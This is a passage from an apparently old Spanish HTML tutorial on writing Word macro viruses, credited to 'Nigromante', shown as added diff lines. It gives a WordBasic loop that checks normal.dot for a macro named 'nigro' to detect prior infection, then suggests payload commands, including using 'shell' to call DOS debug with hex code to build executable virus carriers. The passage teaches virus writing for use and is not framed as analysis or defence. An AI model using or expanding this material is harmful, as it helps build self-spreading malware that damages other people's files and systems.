+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+dentro del normal.dot
+<p>El recorrido por todos los nombres de macros se realiza mediante
+<p>un bucle (si esto es un jodido lenguaje de alto nivel ,aqu&iacute; hay
+de todo)
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+For i = 1 To ContarMacros(1)
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+If NombreMacro$(i, 1) = "nigro" Then
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+infectado = 1
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+End If
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Next i
+<p>Con esto se busca una macro de nombre "nigro" dentro de un archivo
+<p>si lo encuentra infectado tomar&nbsp; el valor 1.En caso contrario
+<p>infectado tendr&nbsp; el valor con el que fue inicializado es decir
+0.
+<p>Comandos interesantes para el payload ser&iacute;an por ejemplo
+<p>shell "comando" con el que puedes ejecutar programas del sistema
+<p>operativo.
+<p>El comando shell es muy interesante para hacer llamadas al programa
+<p>debug del dos con codigo hexadecimal y crear carriers ejecutables
+<p>de virus como en el caso del Ph33r.
+<p>insertar "hola hola hola" puedes insertar texto en el documento activo
+<p>msgbox "virus activado" aparece un cuadro de di&aacute;logo que este
+mensaje
+<p>y desaparece cuando se apreta el boton de
+<p>'aceptar'.
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Bueno si ten&eacute;is dudas pod&eacute;is mandar un mail etc etc etc.
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Curso creado y distribuido por Nigromante
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+MSGBOX " nEUrOtIc cpU is with you!!!!!! "
+<br>&nbsp;
+<br>&nbsp;
+<p><a href="neurotic.htm"><img SRC="forward.jpg" ></a>
+</body>
+</html>
